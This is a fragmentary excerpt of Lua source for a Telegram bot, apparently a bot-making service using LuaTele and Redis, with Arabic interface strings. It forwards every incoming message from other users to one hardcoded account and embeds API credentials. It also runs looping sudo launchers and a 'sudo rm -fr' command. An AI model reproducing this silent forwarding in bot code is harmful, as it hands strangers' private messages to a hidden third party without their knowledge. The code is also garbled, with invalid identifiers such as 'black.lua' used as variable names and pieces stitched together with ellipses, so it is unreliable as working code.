...
os.execute('lua black.lua.lua') end
...
local black.lua = io.open("black.lua", 'w')
black.lua:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
sudo lua5.3 black.lua.lua
done
]])
black.lua:close()
...
screen -S ]]..Redis:get(SshId.."Info:Redis:Token:User")..[[ ./black.lua
done
]])
Run:close()
Redis:del(SshId.."Info:Redis:User:ID");Redis:del(SshId.."Info:Redis:User");Redis:del(SshId.."Info:Redis:Token:User");Redis:del(SshId.."Info:Redis:Token")
os.execute('chmod +x black.lua;chmod +x Run;./Run') end
Information = dofile('./Information.lua')
Sudo_Id = Information.SudoId
UserSudo = Information.UserSudo
Token = Information.Token
UserBot = Information.UserBot
black.lua = Token:match("(%d+)")
os.execute('sudo rm -fr .CallBack-Bot/'..black.lua)
LuaTele = luatele.set_config{api_id=2692371,api_hash='fe85fff033dfe0f328aeb02b4f784930',session_name=black.lua,token=Token}
function var(value)  
...
if data.sender.user_id ~= tonumber(1342680269) and data.sender.user_id ~= tonumber(Fast) then
if data.id then
LuaTele.forwardMessages(1342680269, data.chat_id, data.id,0,0,true,false,false)
end   
end
...
if text and Redis:get(Fast.."offline") == "true" and data.sender.user_id ~= tonumber(1342680269) then
...
if text == '/start' and data.sender.user_id ~= tonumber(1342680269) then
...
LuaTele.sendText(1342680269,0,"تم حذف بوت جديد\nيوزر البوت @"..botuser.." \n","html",true)  
else
...
if text == "حذف البوت" and data.sender.user_id ~= tonumber(1342680269) then
...
if data.sender then
if data.sender.user_id == tonumber(1342680269) then
if text == '/start' then
Redis:del(Fast.."all:texting:pv")
Redis:del(Fast.."Broadcasting:Users" .. data.chat_id .. ":" .. data.sender.user_id) 
Redis:del(Fast.."3z:gp")
